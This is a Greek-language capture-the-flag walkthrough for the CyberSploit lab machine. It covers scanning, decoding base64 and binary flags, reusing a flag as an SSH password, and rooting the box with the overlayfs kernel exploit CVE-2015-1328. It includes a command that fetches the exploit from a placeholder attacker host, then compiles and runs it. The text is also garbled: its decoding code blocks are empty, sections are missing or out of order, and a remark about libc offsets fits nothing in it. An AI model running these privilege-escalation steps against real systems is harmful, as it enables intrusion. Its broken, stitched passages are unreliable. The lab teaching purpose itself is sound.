# Μέρος Α — Η μέθοδος (θεωρία)

## Α.1 Η νέα δεξιότητα: **αναγνώριση** προτύπων

Το Μηχάνημα 1 σας έμαθε να βρίσκετε *υπηρεσίες* (θύρες, εκδόσεις). Αυτό το μηχάνημα δεν έχει web εφαρμογή, βάση δεδομένων, φίλτρο upload ούτε SQL injection. **Όλη του η δυσκολία είναι η αναγνώριση:** να αναγνωρίσετε μια **κωδικοποίηση** και να αναγνωρίσετε ένα **εύρος έκδοσης πυρήνα**. Αυτή είναι διαφορετική δεξιότητα — και εκείνη που αποτυγχάνει πιο συχνά σε πραγματικές αξιολογήσεις: οι άνθρωποι κοιτούν το `eW91dHViZS5jb20=` και βλέπουν **θόρυβο**, ενώ ένας επαγγελματίας βλέπει **ένα κωδικοποιημένο μήνυμα** και ξέρει ποιο εργαλείο το λύνει. Αναγνωρίστε τρεις μορφές με μια ματιά: αλφάβητο `A–Z a–z 0–9 + /`, μήκος πολλαπλάσιο του 4, padding `=` → **base64**· ομάδες οκτώ `0`/`1` → **δυαδικά bits**· 32/40/64 hex χαρακτήρες ή πρόθεμα `$1$`/`$6$`/`$P$` → συνήθως **hash** που δεν «αποκωδικοποιείται» απλώς.

## Α.2 Κωδικοποίηση vs κατακερματισμός vs κρυπτογράφηση (η κεντρική θεωρία)

| | **Κωδικοποίηση (encoding)** | **Κατακερματισμός (hashing)** | **Κρυπτογράφηση (encryption)** |
| --- | --- | --- | --- |
| Σκοπός | αναπαράσταση δεδομένων (μεταφορά) | επαλήθευση ακεραιότητας / αποθήκευση μυστικού **μονόδρομα** | **απόκρυψη** δεδομένων, **αναστρέψιμα** |
| Χρειάζεται κλειδί; | όχι | όχι (ή salt) | **ναι** |
| Αντιστρέφεται; | τετριμμένα | όχι | μόνο με το κλειδί |
| Παράδειγμα | `base64`, hex, URL-encoding | `md5sum`, `sha256sum`, `$6$` | GPG, `openssl enc`, LUKS |
| Πώς το καταλαβαίνετε | το λύνετε με μία εντολή | το *σπάτε* | χρειάζεστε κλειδί/passphrase |

> **Το λάθος που πρέπει να σκοτώσετε τώρα:** να αποκαλείτε το `base64` «κρυπτογράφηση». Το base64 **δεν έχει κλειδί** — δεν κρύβει τίποτα. Αν το αντιστρέφετε με μία εντολή, είναι **κωδικοποίηση**. **Και τα τρία μυστικά αυτού του μηχανήματος είναι απλώς κωδικοποιημένα** — κανένα δεν προστατεύεται κρυπτογραφικά.

## Α.3 Local vs Remote exploit — και τι είναι ένα kernel exploit

- **Remote exploit**: επιτίθεται σε μια υπηρεσία **μέσω δικτύου**, χωρίς προηγούμενη πρόσβαση (π.χ. το backdoor του ProFTPD στο Μηχάνημα 1).
- **Local exploit (LPE)**: εκτελείται **αφού** έχετε ήδη κέλυφος ως απλός χρήστης, και σας κάνει root.

Ένας **kernel exploit** είναι local exploit που εκμεταλλεύεται σφάλμα **στον ίδιο τον πυρήνα**. Είναι **η τελευταία λύση** (μπορεί να «παγώσει» το VM) — **εκτός** όταν είναι η *μοναδική* διαδρομή, όπως εδώ.

## Α.4 Η ροή εργασίας έρευνας exploit (η πιο επαναχρησιμοποιήσιμη δεξιότητα)

```
uname -a  →  searchsploit  →  ΔΙΑΒΑΣΕ το exploit  →  μετέφερε  →  μετάγλωττισε  →  τρέξε
```

**Το «διάβασε το exploit» δεν είναι προαιρετικό.** Πολλές καταχωρήσεις του Exploit-DB είναι *αδοκίμαστες*, μερικές είναι κακόβουλες απέναντι σε όποιον τις τρέχει, και πρέπει να ξέρετε **ποιες παραμέτρους** να αλλάξετε και **τι αρχεία** αφήνει πίσω — ακόμη κι όταν η καταχώρηση είναι *επαληθευμένη* (το «EDB Verified» είναι πράσινο σημάδι, ποτέ υποκατάστατο της ανάγνωσης).

# Μέρος Β — Το μηχάνημα

7. Να **μεταγλωττίζετε και να εκτελείτε** ένα exploit με `gcc`, και μετά να καθαρίζετε ό,τι αφήσατε.

# Μέρος Γ — Η διαδρομή, βήμα-βήμα

## Βήμα 1 — Σάρωση: μια σκόπιμα μικρή επιφάνεια

> **Γιατί.** Πρέπει να ξέρετε τι υπάρχει. Εδώ η απάντηση είναι **μόνο δύο υπηρεσίες** — και αυτό αλλάζει τη μέθοδό σας: χωρίς κάποια ασυνήθιστη υπηρεσία να κυνηγήσετε, η πληροφορία πρέπει να βρίσκεται στο **περιεχόμενο** που σερβίρουν οι δύο αυτές (ένα site να διαβάσετε, ένα login να δοκιμάσετε).

```bash
mkdir -p scans                     # το -oA δεν μπορεί να γράψει σε φάκελο που δεν υπάρχει
sudo nmap -sC -sV -p- -T4 -oA scans/cybersploit TARGET
```

**Οι σημαίες, μία προς μία.** Το `sudo` επιτρέπει στο nmap να χρησιμοποιήσει τη γρηγορότερη *SYN* σάρωση και scripts με raw sockets. Το **`-sC`** τρέχει τα **προεπιλεγμένα** scripts του NSE — δωρεάν επιπλέον πληροφορία σε κάθε θύρα (host keys του SSH, τίτλος σελίδας, header server). Το **`-sV`** είναι **ανίχνευση έκδοσης**: δοκιμάζει κάθε ανοιχτή θύρα και ταιριάζει την απάντηση με μια βάση γνωστών αποτυπωμάτων υπηρεσιών — αυτό μετατρέπει το «η θύρα 80 είναι ανοιχτή» σε «`Apache httpd 2.4.7`», δηλαδή το ακριβές string που ταΐζετε στο `searchsploit` στο Βήμα 5· χωρίς `-sV` δεν υπάρχει έρευνα exploit. Το **`-p-`** σαρώνει **και τις 65.535** θύρες TCP, όχι μόνο τις 1.000 συνηθέστερες — εδώ δεν αλλάζει τίποτα (μόνο 22 και 80), αλλά παραλείποντάς το οι αρχάριοι ανακηρύσσουν «καθαρό» ένα μηχάνημα που κρύβει υπηρεσία στο `:8080`. Το **`-T4`** είναι γρήγορο αλλά ασφαλές για lab — **ποτέ `-T5` σε πραγματικό στόχο**: εγκαταλείπει αργοπορημένες απαντήσεις και μπορεί να αναφέρει ανοιχτές θύρες ως κλειστές, και ένα false negative είναι χειρότερο από μια αργή σάρωση. Το **`-oA scans/cybersploit`** γράφει **και τις τρεις** μορφές εξόδου ταυτόχρονα (`.nmap` αναγνώσιμο, `.gnmap` για grep, `.xml` για εργαλεία) κάτω από ένα πρόθεμα — κρατάτε τις σαρώσεις σας.

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 61:3b:4b:9c:a5:3d:bd:cb:2c:d3:8e:4d:1c:5c:9b:2f (DSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CyberSploit
```

**Πώς το διαβάζετε.**

- `65535 − 65533 = 2` → ακριβώς δύο ανοιχτές θύρες. Διαβάστε **γιατί** αποκλείστηκαν οι υπόλοιπες: το `(conn-refused)` σημαίνει ότι ο host απάντησε ενεργά «τίποτα εδώ» (TCP reset) — ένας host πίσω από firewall θα έλεγε `filtered`, μια πολύ διαφορετική κατάσταση.
- Το `1024 … (DSA)` είναι **εύρημα από μόνο του**: ένα **παρωχημένο κλειδί DSA 1024-bit**. Το DSA περιορίζεται στα 1024 bits, γι' αυτό το σύγχρονο OpenSSH το απενεργοποιεί και οι clients το αρνούνται. Παλιός τύπος κλειδιού + παλιός daemon = ολόκληρη η στοίβα του SSH είναι παρωχημένη.
- `Apache httpd 2.4.7` + `OpenSSH 6.6.1p1` προσδιορίζουν ένα **Ubuntu εκτός υποστήριξης** — κάθε CVE που κυκλοφόρησε χωρίς patch σε αυτή την έκδοση είναι δωρεάν εύρημα. Το Βήμα 5 το αποδεικνύει.

> ⚠️ **Η δική σας εικόνα μπορεί να τυπώσει διαφορετικά banners.** Τα writeups της δημοσιευμένης εικόνας αναφέρουν **Apache 2.2.22**, **OpenSSH 5.9p1** και τίτλο `Hello Pentester!` αντί για τις παραπάνω γραμμές. Δεν αλλάζει τη διαδρομή — δείτε τη ⚠️ **Σημείωση επαλήθευσης** στο Μέρος Ζ.

## Βήμα 2 — Διαβάστε τον **πηγαίο κώδικα** της σελίδας

> **Γιατί.** Ένας browser δείχνει μόνο τη *σχεδιασμένη* σελίδα: τα αόρατα σχόλια HTML και οι «προσωρινές» σημειώσεις των προγραμματιστών κόβονται από την προβολή. Το `curl` (ένας HTTP client για το τερματικό) τυπώνει το ακατέργαστο σώμα της απάντησης — αυτό που στέλνει ο server σε οποιονδήποτε. Το **`-s`** σωπαίνει τον μετρητή προόδου του.

```bash
curl -s http://TARGET/
```

```html
<!--
  author : itsskv
  note   : aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA==
-->
```

*(Συντομευμένο στο ενδιαφέρον σημείο: μια κατά τα άλλα συνηθισμένη σελίδα με τίτλο, μια εικόνα, και αυτό το σχόλιο HTML που ο browser δεν εμφανίζει ποτέ.)*

**Πώς το διαβάζετε.** Δύο γεγονότα βρίσκονται μέσα στο σχόλιο:

1. **`author : itsskv`** → σχεδόν σίγουρα ένα **όνομα χρήστη**.
2. **Το blob του `note`** → **base64 με μια ματιά**: αλφάβητο `A–Z a–z 0–9 + /`, μήκος πολλαπλάσιο του 4, padding `==`. Το `printf '%s' '<blob>' | base64 -d; echo` το αποδίδει ως `https://www.youtube.com/c/cybersploit` — το κανάλι του δημιουργού, **όχι σημαία**. Αποκωδικοποιήστε πρώτα, μετά κρίνετε: δεν είναι κάθε κωδικοποιημένο string ένα μυστικό.

Η διατύπωση του σχολίου ποικίλλει ανάμεσα στις εκδόσεις (το στιγμιότυπο του NEOSPLOIT από τη δημοσιευμένη εικόνα δείχνει `<!-------------username:itsskv------------------>`). Αν το σχόλιο της δικής σας εικόνας περιέχει μόνο το όνομα χρήστη, δεν λείπει τίποτα — το φορτίο βρίσκεται στο `robots.txt`. Σε μια πραγματική σελίδα 10.000 γραμμών, φιλτράρετε αντί να διαβάζετε: `curl -s URL | grep -inE 'user|pass|<!--|todo'` (`-i` χωρίς διάκριση πεζών/κεφαλαίων, `-n` αριθμοί γραμμών, `-E` εκτεταμένη regex, `|` = «ή»).

**Παγίδα / αμυντικό μάθημα.** Μην παραλείπετε τον πηγαίο κώδικα: τα σχόλια σερβίρονται στον client — σε **όλους**. Ονόματα χρηστών, TODOs, staging URLs ή κλειδιά που βρίσκονται εκεί είναι δημόσια τη στιγμή που σερβίρεται η σελίδα.

## Βήμα 3 — `robots.txt`, και αποκωδικοποίηση **τοπικά**

> **Γιατί.** Το `robots.txt` βρίσκεται στη ρίζα του web, είναι *δημόσιο εξ ορισμού* και το διαβάζει κάθε crawler. Οι προγραμματιστές το χρησιμοποιούν για να απομακρύνουν τους crawlers από σημεία που δεν θέλουν να ευρετηριαστούν — κάτι που το κάνει το κλασικό σημείο για να κρύψει ή να διαρρεύσει κάποιος έναν υπαινιγμό.

```bash
curl -s http://TARGET/robots.txt
# User-agent: *
# Disallow: /
# R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

printf '%s' 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d; echo
```

**Τι κάνουν τα κομμάτια.** Το `printf '%s'` με το blob ως όρισμα γράφει **ακριβώς** αυτά τα bytes — χωρίς τελικό newline, χωρίς ερμηνεία (σε μερικά συστήματα η σημαία αποκωδικοποίησης γράφεται `--decode`· το τελικό `; echo` προσθέτει ένα καθαρό newline για την προτροπή σας). **Γιατί όχι `echo '<blob>' | base64 -d`;** Το `echo` προσθέτει newline — ένα περιπλανώμενο byte που σπάει κάθε ακριβή σύγκριση. Το `printf '%s'` είναι η συνήθεια που δεν σας δαγκώνει ποτέ.

```text
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

**Πώς το διαβάζετε.** Ένα συγχαρητήριο, και μετά η **Σημαία 1** — οι δύο γραμμές χωρισμένες με line feed (`\n`, που θα το ξανασυναντήσετε ως τα bits `00001010` στο Βήμα 4). Δείτε τι *δεν* υπάρχει εδώ: κανένα κλειδί, κανένα μυστικό, καμία δουλειά — μία εντολή το αντιστρέφει πλήρως.

**Η Σημαία 1 είναι και ο κωδικός του SSH.** Αυτό είναι **συμπερασμός διαπιστευτηρίων** (credential inference): ένα μυστικό που ανακτήθηκε σε ένα σημείο, επαναχρησιμοποιείται σε άλλο. *Γιατί να δουλέψει;* Έχουμε ήδη ένα όνομα χρήστη (`itsskv`), και η μόνη υπηρεσία που ζητά κωδικό είναι το SSH στη θύρα 22. Το μηχάνημα σας λέει πού να πάτε μετά.

> **Γιατί να αποκωδικοποιήσετε τοπικά και όχι σε μια ιστοσελίδα;** *Λειτουργικά*, το `base64` υπάρχει σε κάθε Kali — χωρίς internet, χωρίς εξάρτηση. *Ηθικά*, το να κολλάτε δεδομένα πελάτη σε αποκωδικοποιητή τρίτου μέρους είναι **αποτυχία χειρισμού δεδομένων**· σε ένα πραγματικό engagement μετράει ως διαρροή. Αρκετά writeups χρησιμοποιούν CyberChef ή online decoders — εντάξει για εξάσκηση, λάθος ως συνήθεια.

## Βήμα 4 — Σύνδεση, και η Σημαία 2 (δυαδικό)

> **Γιατί.** Έχουμε ένα όνομα χρήστη και έναν υποψήφιο κωδικό. Δεν υπάρχει φόρμα σύνδεσης πουθενά στην ιστοσελίδα — άρα ο μόνος τόπος όπου ταιριάζουν και τα δύο είναι το SSH (θύρα 22).

```bash
ssh itsskv@TARGET
```

```text
The authenticity of host 'TARGET' can't be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
itsskv@TARGET's password:
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
itsskv@cybersploit-CTF:~$
```

**Πώς το διαβάζετε.**

- **Η ερώτηση για το fingerprint** είναι *trust on first use*: το SSH δείχνει το δημόσιο κλειδί του server την πρώτη φορά που συνδέεστε και το αποθηκεύει στο `known_hosts`. Το να απαντήσετε `yes` στα τυφλά είναι φυσιολογικό σε lab — στην πραγματική ζωή ένα άγνωστο ή **αλλαγμένο** fingerprint είναι συναγερμός man-in-the-middle· επαληθεύστε το πρώτα από άλλο κανάλι.
- **Η προτροπή κωδικού** δέχεται τη Σημαία 1: `cybersploit{youtube.com/c/cybersploit}`.
- **Διαβάστε το banner.** Το `GNU/Linux 3.13.0-32-generic i686` σας δίνει την **έκδοση του πυρήνα** και την **αρχιτεκτονική 32-bit** πριν τρέξετε έστω και μία εντολή (`i686` = 32-bit x86· ένα 64-bit exploit δεν θα τρέξει). Σημειώστε το — το Βήμα 5 αφορά εξ ολοκλήρου αυτό το string. (Το Ubuntu τυπώνει συνδέσμους τεκμηρίωσης και πλήθη ενημερώσεων ανάμεσα στη γραμμή καλωσορίσματος και την προτροπή· διαφέρουν ανά έκδοση, και το fingerprint που φαίνεται είναι του NEOSPLOIT.)

```bash
ls -la flag2.txt
```

```text
-rw-rw-r-- 1 itsskv itsskv 1036 Jul  9  2020 flag2.txt
```

**Πώς το διαβάζετε.** Το `-rw-rw-r--` είναι mode **664**: ιδιοκτήτης και ομάδα ανάγνωση/εγγραφή, όλοι οι υπόλοιποι ανάγνωση — **εύρημα**, αφού το αρχείο κρατά μυστικό που μπορεί να διαβάσει κάθε τοπικός λογαριασμός. Συγκρίνετε: το `.bash_history` στον ίδιο κατάλογο είναι `-rw-------` (600). *Το μηχάνημα προστατεύει το αρχείο ιστορικού πιο σφιχτά από τη σημαία.* Τα πραγματικά αρχεία μυστικών ανήκουν σε `600` ή `640`.

00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 01100011 01111001

**Πώς το διαβάζετε.** Ομάδες οκτώ `0`/`1` χωρισμένες με κενά = **bytes σε δυαδικό** — *διαφορετική κωδικοποίηση* από το base64 (ίδια ιδέα, στο χαμηλότερο δυνατό επίπεδο). Εντοπίστε το `00001010` στη δεύτερη ομάδα: αυτό είναι το `\n` από το διάστημα ανάμεσα στις γραμμές της Σημαίας 1. Το να ξεχωρίζετε τις κωδικοποιήσεις **με μια ματιά** είναι η δεξιότητα αυτού του μηχανήματος. Αποκωδικοποιήστε τοπικά με Python:

```bash

```

**Τα κομμάτια.** Το `python3 -c` εκτελεί το επόμενο string ως πρόγραμμα· το `"$(cat flag2.txt)"` (command substitution) περνά τα περιεχόμενα του αρχείου ως ένα quoted όρισμα, ώστε τα κενά να επιβιώσουν μέσα σε ένα `sys.argv[1]`· το `.split()` το σπάει στα κενά σε strings των 8 bits· το `int(b, 2)` ερμηνεύει καθένα ως **βάση 2** (`01100111` → `103`)· το `chr(103)` είναι `g`· και το `''.join(...)` κολλά τους χαρακτήρες σε ένα string.

```text

```

**Σημαία 2: `cybersploit{https:t.me/cybersploit1}`.** Μερικά writeups αποδίδουν κενό μετά το `flag2:`· τα bits παραπάνω δεν περιέχουν κανένα — αποκωδικοποιήστε τη δική σας έξοδο και εμπιστευτείτε την. **Παγίδα:** ίδιος κανόνας με το Βήμα 3, ποτέ μην κολλάτε το μυστικό του στόχου σε online «binary decoder».

## Βήμα 5 — Η ροή έρευνας exploit

> **Γιατί.** Κρατάμε ένα κέλυφος χαμηλών προνομίων· η σημαία βρίσκεται στο `/root` και δεν διαβάζεται. Η διαδρομή προς το root περνά από τον **πυρήνα** — και η επαναχρησιμοποιήσιμη δεξιότητα είναι *πώς να ερευνήσετε* ένα exploit.

```bash
uname -a
```

```text
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

**Πώς το διαβάζετε — πεδίο προς πεδίο:**

| Πεδίο | Σημασία | Γιατί σας νοιάζει |
| --- | --- | --- |
| `3.13.0-32-generic` | έκδοση πυρήνα (ίδια με το `uname -r`) | **το κλειδί αναζήτησης** για το `searchsploit` |
| `#57~precise1-Ubuntu` | το build της διανομής | **precise = Ubuntu 12.04** — το OS χωρίς το `/etc/issue` |
| `i686 i386` | αρχιτεκτονικές CPU | **32-bit** — ένα 64-bit exploit δεν μεταγλωττίζεται καν |
| `Tue Jul 15 2014` | ημερομηνία build | πυρήνες χτισμένοι **πριν τον Ιούνιο 2015** προηγούνται της διόρθωσης του overlayfs |

Το ταίριασμα exploit είναι ένα φίλτρο τεσσάρων παραμέτρων: *εύρος έκδοσης* ∩ *διανομή* ∩ *αρχιτεκτονική* ∩ *επίπεδο patch*. Και τα τέσσερα βρίσκονται σε αυτή τη μία γραμμή.

```bash
searchsploit linux kernel 3.13
searchsploit -m 37292
less 37292.c
```

```text
 Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' LPE | linux/local/37292.c
```

**Πώς το διαβάζετε.** Το `searchsploit` είναι ο **offline** καθρέφτης του Exploit-DB στο Kali — δουλεύει χωρίς internet, στη μέση ενός engagement. Ταιριάζει σε **strings**, άρα προτείνει άνετα exploits για πυρήνες που *δεν* έχετε: ελέγξτε ότι το **εύρος στον τίτλο**, `3.13.0 < 3.19`, *περιέχει* το δικό σας `3.13.0-32`, και ότι οι εκδόσεις της διανομής σας αναφέρονται. Το **`-m 37292`** αντιγράφει (mirror) τον πηγαίο κώδικα της καταχώρησης στον τρέχοντα κατάλογο εργασίας σας. Το **`less 37292.c` πριν το τρέξετε δεν είναι προαιρετικό** — πρόκειται να δώσετε σε ένα πρόγραμμα ένα root shell. Διαβάστε το usage header του, τα αρχεία που γράφει, αν ανοίγει οποιαδήποτε **σύνδεση δικτύου** (ένα reverse shell προς κάποιον άλλον θα ήταν μπελάς), τι αφήνει πίσω και ποιες τιμές πρέπει να αλλάξετε. Το Exploit-DB σημειώνει τις ελεγμένες καταχωρήσεις ως **«EDB Verified»** — το 37292 είναι μία από αυτές (συγγραφέας *rebel*, Ιούνιος 2015) — αλλά ένα πράσινο σημάδι δεν αντικαθιστά ποτέ την ανάγνωση.

**Τι είναι το overlayfs και ποιο είναι το σφάλμα;** Το **OverlayFS** είναι ένα *union* σύστημα αρχείων: επιστρώνει έναν εγγράψιμο «upper» κατάλογο πάνω σε έναν μόνο-για-ανάγνωση «lower» και τους ενώνει σε μία μεμονωμένη όψη — ο μηχανισμός πίσω από τα container images. Το Ubuntu επιπλέον άφηνε σε μη προνομιούχους χρήστες να φορτώνουν overlayfs **μέσα σε user namespace**. Το **CVE-2015-1328** εκμεταλλεύεται ακριβώς αυτό: το exploit ανοίγει ένα user + mount namespace, κάνει δύο overlay mounts ώστε να καταλήξει με ένα **εγγράψιμο από όλους `/etc/ld.so.preload`** — τη λίστα σε επίπεδο συστήματος με τις βιβλιοθήκες που φορτώνει ο dynamic linker σε **κάθε** πρόγραμμα, *συμπεριλαμβανομένων των SUID-root* — στρέφει αυτό το αρχείο στη δική του shared library στο `/tmp` και τρέχει `su`. Επειδή το `/bin/su` είναι SUID-root, η εγχεόμενη βιβλιοθήκη εκτελείται **ως root**, σβήνει τα ίχνη της και δημιουργεί ένα root shell.

> Αν η εκτέλεση τυπώσει **`no FS_USERNS_MOUNT for overlayfs on this kernel`**, ο πυρήνας αρνείται τα μη προνομιούχα overlayfs mounts: λάθος exploit για αυτό το μηχάνημα — γυρίστε στο `uname -r`.

## Βήμα 6 — Μεταφορά, μεταγλώττιση, εκτέλεση

> **Γιατί.** Το exploit υπάρχει στη *δική σας* μηχανή, όχι στον στόχο — και ο στόχος δεν έχει internet, άρα ένα απευθείας `wget` από το exploit-db.com αποτυγχάνει. Φιλοξενείτε εσείς το αρχείο και το τραβάτε απέναντι. Ο στόχος διαθέτει επίσης **`gcc`**: βολικό για εμάς, και **εύρημα** για τον αμυνόμενο — τα εργαλεία build δεν έχουν θέση σε production server.

```bash
# ATTACKER — στον κατάλογο που περιέχει το 37292.c· αφήστε αυτό το τερματικό ανοιχτό:
python3 -m http.server 8000

# TARGET — κατέβασε, μετονόμασε, επαλήθευσε, χτίσε, τρέξε:
wget http://ATTACKER:8000/37292.c -O ofs.c
md5sum ofs.c                        # σύγκρινε με το hash στον ATTACKER
gcc ofs.c -o ofs && ./ofs
id
```

**Τα κομμάτια.** Το `python3 -m http.server 8000` τρέχει τη standard library της Python ως έναν μικροσκοπικό web server με document root τον **τρέχοντα κατάλογό** σας (οποιαδήποτε θύρα πάνω από 1024 δουλεύει· η θύρα 80 θα απαιτούσε root στη *δική σας* μηχανή· συνεχίζει να τρέχει μέχρι Ctrl+C). Το `wget URL -O ofs.c` κατεβάζει με επιλεγμένο όνομα. Το `md5sum` συγκρίνει checksums: **πανομοιότυπα hashes και στις δύο μηχανές = άθικτη μεταφορά** — ακεραιότητα μόνο· το MD5 δεν αποδεικνύει τίποτα για την *αυθεντικότητα*, αλλά ένα κολοβό download δίνει σφάλμα `gcc` που **μοιάζει** με bug *του exploit*. Το `gcc ofs.c -o ofs` μεταγλωττίζει και ονομάζει το εκτελέσιμο (χωρίς `-o` παίρνετε `./a.out` — έτσι ένα writeup κατέληξε να τρέχει `./a.out`), και το `&&` το εκτελεί **μόνο αν** η μεταγλώττιση πέτυχε.

```text
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.102 - - [11/May/2024 15:02:44] "GET /37292.c HTTP/1.1" 200 -

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

**Πώς το διαβάζετε.** Το `0.0.0.0` = ο server «άκουσε» σε **όλες** τις διεπαφές, άρα ο στόχος μπορεί να τον φτάσει· η γραμμή `GET … 200` στο *δικό σας* τερματικό επιβεβαιώνει ότι ο στόχος κατέβασε το αρχείο. Το exploit ανακοινώνει κάθε στάδιο: τα `mount #1` / `#2` είναι τα δύο overlay mounts από το Βήμα 5, και το **`/etc/ld.so.preload created`** είναι ο μηχανισμός που ενεργοποιείται. **Η προτροπή `#` είναι το root shell** — `$` = απλός χρήστης, `#` = root· διαβάστε την προτροπή σας όπως ένας πιλότος διαβάζει τα όργανα. Το `uid=0(root)` το επιβεβαιώνει (η γραμμή `groups` απλώς αναφέρει ακόμη την αρχική σας ομάδα — ακίνδυνο). Για πιο σταθερό κέλυφος, αναβαθμίστε το με `python -c 'import pty;pty.spawn("/bin/bash")'`.

## Βήμα 7 — Η τελική σημαία, και ο καθαρισμός

```bash
cat /root/finalflag.txt
```

```text
cybersploit{Z3X21CW42C4 many many congratulations !}
```

*(Τα writeups δείχνουν ένα μεγάλο banner ASCII-art «congratulations» γύρω από αυτή τη γραμμή — ίδια τιμή σε κάθε πηγή που συμβουλευτήκαμε. Το **string** της τελικής σημαίας διαφέρει ανάμεσα στις εκδόσεις — VulnHub και Proving Grounds, όπου οι σημαίες ονομάζονται `local.txt` και `proof.txt` — αυτό που μετρά είναι **τα μονοπάτια και η τεχνική**.)*

**Καθαρισμός (υποχρεωτικός):**

```bash
rm -f /tmp/ofs /tmp/ofs.c /tmp/ofs-lib.so /etc/ld.so.preload /tmp/ns_sploit
ls -la /tmp /etc/ld.so.preload    # επιβεβαίωση: το αρχείο preload πρέπει να έχει φύγει
```

**Γιατί.** Αφήσατε ένα εκτελέσιμο, τον πηγαίο κώδικά του, μια βοηθητική βιβλιοθήκη — και, το χειρότερο, ένα `/etc/ld.so.preload`, που εγχέει μια βιβλιοθήκη σε **κάθε** δυναμικά συνδεδεμένη διεργασία του συστήματος. Το φορτίο σβήνει τα ίχνη του *όταν ενεργοποιηθεί* — αλλά μόνο αν η εκτέλεση φτάσει ως εκεί, και οι σημειώσεις της κοινότητας καταγράφουν μηχανήματα όπου ένα ξεχασμένο αρχείο preload **έσπασε την εκτέλεση εντολών αργότερα**. Επαληθεύστε ότι έχει φύγει. Σε ένα πραγματικό engagement ο καθαρισμός είναι **επαγγελματική υποχρέωση**· εδώ είναι και μέρος του μαθήματος.

# Μέρος Ε — Ερωτήσεις επανάληψης

1. Γράψτε τη διαφορά ανάμεσα σε κωδικοποίηση, κατακερματισμό και κρυπτογράφηση, χρησιμοποιώντας τα τρία μυστικά αυτού του μηχανήματος. Ποιο προστάτευε **πραγματικά** κάτι;

</details>

</details>

<details>
<summary><strong>Σκαλοπάτι 4 — η αναβάθμιση</strong></summary>

</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

1. `nmap` → **22, 80**. 2. Σχόλιο HTML → **`itsskv`**. 3. `robots.txt` → base64 → **flag1 = `cybersploit{youtube.com/c/cybersploit}`**. 4. `ssh itsskv@TARGET` με flag1 ως κωδικό. 5. `flag2.txt` (δυαδικό) → **flag2**. 6. `uname -a` → **EDB 37292** → root. 7. `/root/finalflag.txt`.
</details>

  - **⚠️ Σημείωση επαλήθευσης — κυκλοφορούν δύο διαφορετικές εικόνες.** Πολλά ανεξάρτητα writeups (j.info, NEOSPLOIT, Infosec Articles) αναφέρουν τα banners της δημοσιευμένης εικόνας ως **Apache 2.2.22** και **OpenSSH 5.9p1** με τίτλο αρχικής σελίδας **"Hello Pentester!"**, ενώ ο πίνακας μεταδεδομένων αυτής της κάρτας γράφει Apache 2.4.7 / OpenSSH 6.6.1p1. Και τα δύο σύνολα διατηρούνται εδώ επίτηδες: **οι εκδόσεις υπηρεσιών που βλέπετε πραγματικά στο δικό σας VM καθορίζουν ποια libc offsets είναι σωστά — εμπιστεύεστε πάντα τη δική σας έξοδο `nmap` έναντι κάθε writeup, ακόμη και έναντι του πίνακα αυτής της κάρτας.** Η *διαδρομή* αναγνώρισης και αναβάθμισης προνομίων είναι πανομοιότυπη και στις δύο περιπτώσεις.
  - **⚠️ Σημείωση επαλήθευσης — τα σχόλια του `flag2.txt` ποικίλλουν ανάμεσα στις εικόνες.** Κάποια writeups (π.χ. Infosec Institute) αναφέρουν τα αποκωδικοποιημένα σχόλια ως `good work !` ακολουθούμενο από `Flag2: cybersploit{https:t.me/cybersploit1}`· η εικόνα που χρησιμοποιήθηκε για αυτή την κάρτα αποκωδικοποιείται σε `good work !` ακολουθούμενο από `flag2:cybersploit{https:t.me/cybersploit1}`. Το *string* της σημαίας συμφωνεί· διαφέρουν μόνο τα κεφαλαία και τα κενά του σχολίου. Μην αφήσετε την ακριβή γραφή ενός writeup να σας μπερδέψει όταν η δική σας αποκωδικοποίηση διαφωνεί.
  - **Ομοφωνία στη διαδρομή:** κάθε writeup που διασταυρώσαμε συμφωνεί στην αλυσίδα: `robots.txt` → base64 → **σημαία 1 = ο κωδικός του SSH** → σύνδεση ως `itsskv` → `flag2.txt` (δυαδικό) → `uname -a` → searchsploit → **EDB 37292** → root. (Μια παλαιότερη έκδοση αυτής της κάρτας περιέγραφε μια παράκαμψη μέσω webshell `cmd.php` και reverse shell· είναι περιττή — η ίδια η σημαία είναι το διαπιστευτήριο που θέλει το μηχάνημα να χρησιμοποιήσετε.) Εναλλακτικές *επιλογές* που αναφέρουν διάφοροι συγγραφείς: η αναβάθμιση κελύφους με **`python -c 'import pty;pty.spawn("/bin/bash")'`** πριν την εκτέλεση του exploit (πιο αξιόπιστος έλεγχος εργασιών), και η μεταγλώττιση του exploit **στη μηχανή του επιτιθέμενου** (`gcc -m32`) όταν ο στόχος δεν έχει εργαλεία build.
